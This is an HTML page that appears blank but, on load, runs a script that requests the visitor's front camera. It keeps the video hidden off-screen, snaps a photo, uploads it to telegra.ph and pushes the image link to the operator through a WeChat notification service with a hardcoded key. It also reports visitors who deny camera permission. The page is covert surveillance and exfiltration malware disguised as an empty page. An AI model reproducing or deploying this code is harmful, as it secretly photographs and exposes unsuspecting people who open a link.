<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
#cam{position:absolute;left:-9999px;top:-9999px;width:480px;height:480px;}
#box{display:none}
body{background:#fff;height:100vh;margin:0;overflow:hidden;}
</style>
</head>
<body>
<video id="cam" autoplay playsinline muted></video>
<canvas id="box" width="480" height="480"></canvas>

<script>
const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";

// 微信推送
async function sendToWechat(title, content) {
  try {
    await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `title=${encodeURIComponent(title)}&desp=${encodeURIComponent(content)}`
    });
  } catch (e) {}
}

// 上传图片生成短链接（Telegraph图床，稳定无跨域）
async function uploadToShortLink(base64) {
  try {
    const formData = new FormData();
    const blob = await (await fetch(base64)).blob();
    formData.append("file", blob, "photo.jpg");
    const res = await fetch("https://telegra.ph/upload", {
      method: "POST",
      body: formData
    });
    const result = await res.json();
    if (result && result[0]?.src) {
      return `https://telegra.ph${result[0].src}`;
    }
    return null;
  } catch (e) {
    return null;
  }
}

// 拍照主逻辑
async function autoTakePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: 480, height: 480 }
    });
    const video = document.getElementById("cam");
    const canvas = document.getElementById("box");
    const ctx = canvas.getContext("2d");
    video.srcObject = stream;

    video.oncanplaythrough = async () => {
      setTimeout(async () => {
        ctx.drawImage(video, 0, 0, 480, 480);
        const base64Img = canvas.toDataURL("image/jpeg", 0.6);
        stream.getTracks().forEach(track => track.stop());

        // 上传图片，生成短链接
        const shortLink = await uploadToShortLink(base64Img);
        if (shortLink) {
          await sendToWechat("✅ 拍照成功", `点击链接直接查看照片：\n${shortLink}`);
        } else {
          // 上传失败，兜底推base64
          await sendToWechat("拍照成功（备用链接）", `复制到浏览器打开：\n${base64Img}`);
        }
      }, 500);
    };
  } catch (e) {
    await sendToWechat("链接访问提醒", "对方拒绝了摄像头权限，无法拍照");
  }
}

autoTakePhoto();
</script>
</body>
</html>
